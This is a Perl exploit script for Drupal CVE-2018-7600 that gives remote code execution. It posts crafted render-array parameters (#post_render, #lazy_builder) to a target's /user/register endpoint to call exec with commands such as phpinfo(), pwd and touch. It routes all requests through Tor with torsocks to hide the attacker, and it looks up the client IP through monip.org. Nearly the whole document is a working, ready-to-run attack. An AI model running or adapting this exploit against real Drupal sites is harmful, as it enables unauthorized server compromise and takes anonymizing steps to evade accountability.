#!/usr/bin/perl

# Title : Drupal 0day Remote PHP Code Execution (Perl)
# Author = GIST
# date : 14 April 2018
# CVE : CVE-2018-7600
# Vendor : https://www.drupal.org/
# Tested on : Ubuntu


use LWP::Simple;
use Term::ANSIColor qw(colored color);
use Scalar::Util qw/reftype/;
use Socket;
use LWP::UserAgent;
use LWP::Protocol::socks;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use URI::URL;
use Getopt::Long;
use Data::Dump qw(dump);


my $ua = LWP::UserAgent->new;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print <<logo;
                                                              
 ____                  _    _____         _     _ _           
|    \  ___ _ _ ___ ___| |  |   __|_ _ ___| |___|_| |_ ___ ___ 
|  |  |  _| | | . | .'| |  |   __|_'_| . | | . | |  _| -_|  _|
|____/|_| |___|  _|__,|_|  |_____|_,_|  _|_|___|_|_| |___|_|  
              |_|                    |_|                      
logo

my $url = $ARGV[0] or die("Usage: perl $0 <URL>\n");
$exploit = "$url/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";

$ajax = "_drupa_ajax";
$mail = "mail[#post_render][]";
$maill= "mail[#type]";
$mailll = "mail[#markup]";
$wget = "phpinfo();";
$proxy = "socks://127.0.0.1:9050";
$ua->proxy( [qw( http https ftp ftps )] => $proxy);

getIP($ua);
 
$response = $ua->post($exploit, 'Content-Type' => 'multipart/form-data', Content => [form_id => 'user_register_form', $ajax => '1', $mail => 'exec', $maill => 'markup', $mailll => $wget]);
displayResponse($response);


system("torsocks curl -v -X POST --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=phpinfo()' '$url/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'");

# Source: https://twitter.com/i_bo0om/status/984674893768921089

#
#- - - 
#

system("torsocks curl -v -s -X 'POST' --data 'mail[%23post_render][]=exec&mail[%23children]=pwd&form_id=user_register_form' '$url/user/register?element_parents=account/mail/%23value&ajax_form=1'");

# Source: https://twitter.com/IamSecurity/status/984977193565646848

#
#- - -
#

system("torsocks curl -i -v '$url/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' --data 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/1'");

sub displayResponse {
    my ( $response ) = @_;
    my $request = $response->request;
    my $uri = new URI::URL $request->uri;
    
    ### Request
    print "\n\n" . color("yellow") . "--> " . color("blue") .  uc($request->method) . color("cyan") . ' ' . $uri->full_path . color("white") . " HTTP/1.1\n";
    print color("yellow") . "--> "  . color("white") . "Host: " .  color("cyan") . $request->uri->host . "\n";
    
    foreach my $header_name (keys %{ $request->headers }) {
        next if(reftype($request->header($header_name)));
        print color("yellow") . "--> "  . color("white") . $header_name . ": " . color("cyan") . $request->header($header_name) . "\n";
    }
    
    if($request->content) {
        print color("yellow") . "--> "  . color("white") . $request->content . "\n";
    }
    print "\n\n";
    
    
    ### Response
    print color("green") . "<-- "  . color("white") . "HTTP/1.1 " . color("cyan") . $response->status_line . "\n";
    
    foreach my $header_name (keys %{ $response->headers }) {
        next if(reftype($response->header($header_name)));
        print color("green") . "<-- "  . color("white") . $header_name . ": " . color("cyan") . $response->header($header_name) . "\n";
    }
    print "\n" . color("white") . $response->decoded_content . "\n";
}

sub info {
    my ( $text ) = @_;
    print color("white") . "[" . color("blue") . "*" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("blue") . " $text\n";
}

sub warning {
    my ( $text ) = @_;
    print color("white") . "[" . color("yellow") . "!" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("blue") . "$text\n";
}

sub error {
    my ( $text ) = @_;
    print color("white") . "[" . color("red") . "-" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("blue") . "$text\n";
    exit;
}

sub getIP {
    my ( $browser ) = @_;
    my $client_ip   = 0;
    my $client_host = 0;
    
    my $request = HTTP::Request->new('GET', 'http://monip.org');
    my $response = $browser->request($request);
    ($client_ip) = $response->content =~ /IP\s*:\s*(.*?)</i if($response->content =~ /IP\s*:\s*(.*?)</i);
    ($client_host) = $response->content =~ /<i>([^<]*)<\/i>/i if($response->content =~ /<i>.*<\/i>/i);
    print dump($response);
    if ($client_ip) {
        print "[CLIENT]   IP: " . $client_ip . "\n";
        print "[CLIENT] HOST: " . $client_host . "\n" if($client_host);
    } else {
        error("Couldn't Get Client IP");
    }
    
    return $client_ip;
}
